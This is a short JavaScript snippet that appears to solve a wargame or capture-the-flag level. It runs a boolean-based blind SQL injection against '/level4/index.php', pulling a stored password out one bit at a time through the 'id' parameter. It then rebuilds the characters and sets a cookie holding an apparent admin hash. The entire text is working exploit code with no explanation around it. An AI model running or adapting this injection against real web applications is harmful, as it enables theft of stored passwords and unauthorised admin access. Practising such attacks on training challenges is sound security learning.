function go(i,j){var xhr = new XMLHttpRequest(); xhr.open('GET','/level4/index.php?action=pm&id=1 and substr(lpad(bin(ascii(substr((select pass from level4 limit 1,1),' + i + ',1))),8,0),' + j + ',1)'); xhr.send(null); xhr.onreadystatechange = function() {if(xhr.readyState == 4 && xhr.status == 200){rst[i-1][j-1] = ~~!!xhr.responseText.match('admin'); console.log(rst[i-1]); if(rst[i-1].toString().replace(/,/g,'').length == 8){rst[i-1] = (rst[i-1].toString().replace(/,/g,''))}}};}
﻿
var rst = []; for(var i=1; i<=32; i++){rst[i-1] = []; for(var j=1;j<=8;j++){go(i,j)}}
var str = ''; for(var k = 0; k<rst.length; k++){str += String.fromCharCode(parseInt(rst[k],2).toString())}

document.cookie = "admin%2598aa0ec014a46e34571affaf88999ebb";
